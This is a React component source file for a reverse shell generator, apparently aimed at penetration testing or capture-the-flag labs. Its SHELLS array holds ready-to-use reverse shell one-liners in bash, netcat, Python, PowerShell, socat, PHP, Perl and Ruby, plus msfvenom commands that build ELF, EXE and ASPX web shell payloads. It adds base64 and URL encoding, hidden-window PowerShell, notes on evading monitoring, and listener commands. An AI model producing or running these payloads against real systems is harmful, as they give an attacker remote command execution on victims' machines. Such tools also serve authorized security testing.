import { useState, useEffect, useMemo } from "react";
import { Copy, Check, Terminal, Shield, Zap, Sparkles, RefreshCw } from "lucide-react";

interface ShellTemplate {
  id: string;
  name: string;
  category: "Linux" | "Windows" | "Scripting" | "Framework";
  raw: (ip: string, port: string) => string;
  notes?: string;
}

const SHELLS: ShellTemplate[] = [
  {
    id: "bash-i",
    name: "Bash -i",
    category: "Linux",
    raw: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    notes: "Classic interactive bash shell. Requires bash compiled with --enable-net-redirections.",
  },
  {
    id: "bash-196",
    name: "Bash 196",
    category: "Linux",
    raw: (ip, port) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
    notes: "Bypasses standard file descriptor monitoring by using descriptor 196.",
  },
  {
    id: "bash-read",
    name: "Bash Readline",
    category: "Linux",
    raw: (ip, port) => `exec 5<>/dev/tcp/${ip}/${port}; cat <&5 | while read line; do $line 2>&5 >&5; done`,
    notes: "Pure shell loop executing incoming lines. Does not require interactive bash.",
  },
  {
    id: "nc-mkfifo",
    name: "Netcat mkfifo",
    category: "Linux",
    raw: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    notes: "Works on standard modern Netcat (openbsd) where -e is disabled.",
  },
  {
    id: "nc-e",
    name: "Netcat -e",
    category: "Linux",
    raw: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
    notes: "Requires traditional Netcat with GAPING_SECURITY_HOLE enabled.",
  },
  {
    id: "python3-socket",
    name: "Python 3 Socket",
    category: "Scripting",
    raw: (ip, port) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
    notes: "Spawns full interactive PTY with /bin/bash.",
  },
  {
    id: "python3-short",
    name: "Python 3 Short",
    category: "Scripting",
    raw: (ip, port) =>
      `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
    notes: "Compact Python 3 reverse shell using list comprehension dup2 loop.",
  },
  {
    id: "pwsh-tcp",
    name: "PowerShell TCP Client",
    category: "Windows",
    raw: (ip, port) =>
      `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    notes: "Standard PowerShell reverse shell string without external dependencies.",
  },
  {
    id: "pwsh-base64",
    name: "PowerShell EncodedCommand",
    category: "Windows",
    raw: (ip, port) => {
      const script = `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      // UTF-16LE encoding required for PowerShell -EncodedCommand
      if (typeof window !== "undefined") {
        const codeUnits = new Uint16Array(script.length);
        for (let i = 0; i < script.length; i++) codeUnits[i] = script.charCodeAt(i);
        const charCodes = new Uint8Array(codeUnits.buffer);
        let binary = "";
        for (let i = 0; i < charCodes.byteLength; i++) binary += String.fromCharCode(charCodes[i]);
        return `powershell -nop -w hidden -EncodedCommand ${btoa(binary)}`;
      }
      return `powershell -nop -w hidden -EncodedCommand <encoded_payload>`;
    },
    notes: "Base64 UTF-16LE encoded. Evades CLI parameter quotes and special characters.",
  },
  {
    id: "socat",
    name: "Socat TTY",
    category: "Linux",
    raw: (ip, port) =>
      `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
    notes: "Full PTY shell with job control. Catch with: socat file:`tty`,raw,echo=0 tcp-listen:${port}",
  },
  {
    id: "php-exec",
    name: "PHP Exec",
    category: "Scripting",
    raw: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    notes: "Requires allow_url_fopen or direct fsockopen execution permissions.",
  },
  {
    id: "perl",
    name: "Perl Socket",
    category: "Scripting",
    raw: (ip, port) =>
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    notes: "Reliable POSIX Perl reverse shell.",
  },
  {
    id: "ruby",
    name: "Ruby TCPSocket",
    category: "Scripting",
    raw: (ip, port) =>
      `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    notes: "Compact Ruby one-liner leveraging file descriptor dup.",
  },
  {
    id: "msfvenom-elf",
    name: "Msfvenom Linux ELF",
    category: "Framework",
    raw: (ip, port) =>
      `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o rev.elf`,
    notes: "Generates a 64-bit Linux standalone ELF binary payload.",
  },
  {
    id: "msfvenom-exe",
    name: "Msfvenom Windows EXE",
    category: "Framework",
    raw: (ip, port) =>
      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o rev.exe`,
    notes: "Generates a 64-bit Windows standalone executable payload.",
  },
  {
    id: "msfvenom-aspx",
    name: "Msfvenom IIS ASPX",
    category: "Framework",
    raw: (ip, port) =>
      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f aspx -o shell.aspx`,
    notes: "Web shell payload for Microsoft IIS web servers.",
  },
];

export function RevShellGen() {
  const [ip, setIp] = useState("10.10.14.X");
  const [port, setPort] = useState("4444");
  const [selectedShellId, setSelectedShellId] = useState("bash-i");
  const [encoding, setEncoding] = useState<"raw" | "base64" | "url">("raw");
  const [activeCategory, setActiveCategory] = useState<string>("All");
  const [copiedPayload, setCopiedPayload] = useState(false);
  const [copiedListener, setCopiedListener] = useState<string | null>(null);

  // Load from localStorage on client
  useEffect(() => {
    try {
      const savedIp = localStorage.getItem("revshell_ip");
      const savedPort = localStorage.getItem("revshell_port");
      if (savedIp) setIp(savedIp);
      if (savedPort) setPort(savedPort);
    } catch {}
  }, []);

  const handleIpChange = (val: string) => {
    setIp(val);
    try {
      localStorage.setItem("revshell_ip", val);
    } catch {}
  };

  const handlePortChange = (val: string) => {
    setPort(val);
    try {
      localStorage.setItem("revshell_port", val);
    } catch {}
  };

  const selectedShell = useMemo(
    () => SHELLS.find((s) => s.id === selectedShellId) || SHELLS[0],
    [selectedShellId],
  );

  const rawPayload = useMemo(() => {
    return selectedShell.raw(ip.trim() || "10.10.14.X", port.trim() || "4444");
  }, [selectedShell, ip, port]);

  const displayPayload = useMemo(() => {
    if (encoding === "base64") {
      try {
        const b64 = btoa(rawPayload);
        return `echo "${b64}" | base64 -d | bash`;
      } catch {
        return rawPayload;
      }
    }
    if (encoding === "url") {
      return encodeURIComponent(rawPayload);
    }
    return rawPayload;
  }, [rawPayload, encoding]);

  const handleCopyPayload = () => {
    navigator.clipboard.writeText(displayPayload);
    setCopiedPayload(true);
    setTimeout(() => setCopiedPayload(false), 2000);
  };

  const handleCopyListener = (cmd: string, id: string) => {
    navigator.clipboard.writeText(cmd);
    setCopiedListener(id);
    setTimeout(() => setCopiedListener(null), 2000);
  };

  const categories = ["All", "Linux", "Windows", "Scripting", "Framework"];
  const filteredShells = useMemo(() => {
    if (activeCategory === "All") return SHELLS;
    return SHELLS.filter((s) => s.category === activeCategory);
  }, [activeCategory]);

  return (
    <div className="space-y-6 font-sans">
      {/* Configuration Header Card */}
      <div className="rounded-xl border border-border bg-card p-5 md:p-6 space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border pb-4">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center">
              <Zap className="w-4 h-4 text-emerald-400" />
            </div>
            <div>
              <h2 className="text-base font-bold text-foreground">Reverse Shell Config</h2>
              <p className="text-xs text-muted-foreground">
                Payloads auto-update with your IP & listener port
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => {
                handleIpChange("10.10.14.X");
                handlePortChange("4444");
              }}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-border text-xs text-muted-foreground hover:text-foreground hover:bg-muted/50 transition-colors cursor-pointer"
            >
              <RefreshCw className="w-3 h-3" />
              <span>Reset</span>
            </button>
          </div>
        </div>

        {/* Inputs */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
          <div className="space-y-1.5">
            <label className="text-xs font-mono uppercase text-muted-foreground tracking-wider flex items-center justify-between">
              <span>LHOST (IP)</span>
              <span className="text-[10px] text-emerald-400">TUN0 / HOST</span>
            </label>
            <input
              type="text"
              value={ip}
              onChange={(e) => handleIpChange(e.target.value)}
              placeholder="10.10.14.X"
              className="w-full px-3.5 py-2 rounded-lg border border-border bg-muted/40 text-foreground font-mono text-sm focus:outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/30 transition-all"
            />
          </div>

          <div className="space-y-1.5">
            <label className="text-xs font-mono uppercase text-muted-foreground tracking-wider flex items-center justify-between">
              <span>LPORT (Port)</span>
              <span className="text-[10px] text-cyan-400">LISTENER</span>
            </label>
            <input
              type="text"
              value={port}
              onChange={(e) => handlePortChange(e.target.value)}
              placeholder="4444"
              className="w-full px-3.5 py-2 rounded-lg border border-border bg-muted/40 text-foreground font-mono text-sm focus:outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/30 transition-all"
            />
          </div>

          <div className="space-y-1.5 sm:col-span-2 md:col-span-1">
            <label className="text-xs font-mono uppercase text-muted-foreground tracking-wider">
              Encoding Method
            </label>
            <div className="grid grid-cols-3 gap-1 bg-muted/40 p-1 rounded-lg border border-border">
              {(["raw", "base64", "url"] as const).map((enc) => (
                <button
                  key={enc}
                  onClick={() => setEncoding(enc)}
                  className={`py-1 rounded-md text-xs font-mono uppercase transition-all cursor-pointer ${
                    encoding === enc
                      ? "bg-emerald-500/20 text-emerald-400 font-bold border border-emerald-500/40"
                      : "text-muted-foreground hover:text-foreground"
                  }`}
                >
                  {enc}
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Main Grid: Selector Left, Output Right */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Shell Selector */}
        <div className="lg:col-span-5 space-y-3">
          {/* Category Filter Pills */}
          <div className="flex flex-wrap gap-1.5 pb-1">
            {categories.map((cat) => (
              <button
                key={cat}
                onClick={() => setActiveCategory(cat)}
                className={`px-3 py-1 rounded-full text-xs font-medium transition-all cursor-pointer ${
                  activeCategory === cat
                    ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 font-semibold"
                    : "bg-muted/50 text-muted-foreground border border-border hover:text-foreground"
                }`}
              >
                {cat}
              </button>
            ))}
          </div>

          {/* List of Shells */}
          <div className="space-y-2 max-h-[480px] overflow-y-auto pr-1">
            {filteredShells.map((shell) => {
              const isSelected = shell.id === selectedShell.id;
              return (
                <button
                  key={shell.id}
                  onClick={() => setSelectedShellId(shell.id)}
                  className={`w-full text-left p-3 rounded-xl border transition-all cursor-pointer flex items-center justify-between gap-3 ${
                    isSelected
                      ? "bg-emerald-500/10 border-emerald-500/40 shadow-[0_0_15px_rgba(52,211,153,0.12)] text-foreground"
                      : "bg-card border-border hover:border-emerald-500/30 text-muted-foreground hover:text-foreground"
                  }`}
                >
                  <div className="min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="font-semibold text-sm text-foreground">{shell.name}</span>
                      <span className="text-[10px] px-2 py-0.5 rounded-md border border-border bg-muted/60 font-mono">
                        {shell.category}
                      </span>
                    </div>
                    {shell.notes && (
                      <p className="text-xs text-muted-foreground line-clamp-1 mt-1 font-sans">
                        {shell.notes}
                      </p>
                    )}
                  </div>
                  <Terminal
                    className={`w-4 h-4 shrink-0 ${
                      isSelected ? "text-emerald-400" : "text-muted-foreground/50"
                    }`}
                  />
                </button>
              );
            })}
          </div>
        </div>

        {/* Right Column: Generated Payload & Listeners */}
        <div className="lg:col-span-7 space-y-4">
          {/* Active Payload Box */}
          <div className="rounded-xl border border-border bg-card overflow-hidden">
            <div className="flex items-center justify-between border-b border-border bg-muted/20 px-4 py-3">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-emerald-400" />
                <span className="text-xs font-mono font-semibold uppercase tracking-wider text-foreground">
                  {selectedShell.name} // Payload
                </span>
              </div>
              <button
                onClick={handleCopyPayload}
                className="inline-flex items-center gap-1.5 px-3 py-1 rounded-md text-xs font-semibold bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 hover:bg-emerald-500/30 transition-all cursor-pointer"
              >
                {copiedPayload ? (
                  <>
                    <Check className="w-3.5 h-3.5" />
                    <span>COPIED!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>COPY PAYLOAD</span>
                  </>
                )}
              </button>
            </div>

            <div className="p-4 bg-background/60">
              <pre className="font-mono text-xs text-emerald-300 break-all whitespace-pre-wrap select-all leading-relaxed max-h-[160px] overflow-y-auto">
                {displayPayload}
              </pre>
            </div>

            {selectedShell.notes && (
              <div className="border-t border-border px-4 py-2.5 bg-muted/10 text-xs text-muted-foreground flex items-center gap-2">
                <Shield className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                <span>{selectedShell.notes}</span>
              </div>
            )}
          </div>

          {/* Quick Catch Listeners Box */}
          <div className="rounded-xl border border-border bg-card p-4 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-mono font-semibold uppercase tracking-wider text-muted-foreground flex items-center gap-2">
                <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
                One-Click Catch Listeners
              </span>
              <span className="text-[11px] font-mono text-muted-foreground">Port: {port}</span>
            </div>

            <div className="space-y-2">
              {[
                {
                  id: "rlwrap",
                  label: "rlwrap Netcat (History & Line Editing)",
                  cmd: `rlwrap nc -lvnp ${port}`,
                },
                {
                  id: "standard",
                  label: "Standard Netcat Listener",
                  cmd: `nc -lvnp ${port}`,
                },
                {
                  id: "pwncat",
                  label: "Pwncat-CS Enhanced Shell",
                  cmd: `pwncat-cs -lp ${port}`,
                },
                {
                  id: "socat",
                  label: "Socat Full TTY Listener",
                  cmd: `socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`,
                },
              ].map((listener) => {
                const isCopied = copiedListener === listener.id;
                return (
                  <div
                    key={listener.id}
                    className="flex items-center justify-between gap-3 p-2.5 rounded-lg border border-border bg-background/50 hover:border-cyan-500/30 transition-all font-mono text-xs"
                  >
                    <div className="min-w-0 flex-1">
                      <div className="text-[10px] text-muted-foreground uppercase mb-0.5">
                        {listener.label}
                      </div>
                      <div className="text-cyan-300 truncate">{listener.cmd}</div>
                    </div>
                    <button
                      onClick={() => handleCopyListener(listener.cmd, listener.id)}
                      className="p-1.5 rounded-md border border-border bg-muted/40 hover:bg-muted text-muted-foreground hover:text-foreground transition-colors cursor-pointer shrink-0"
                      title="Copy listener command"
                    >
                      {isCopied ? (
                        <Check className="w-3.5 h-3.5 text-emerald-400" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
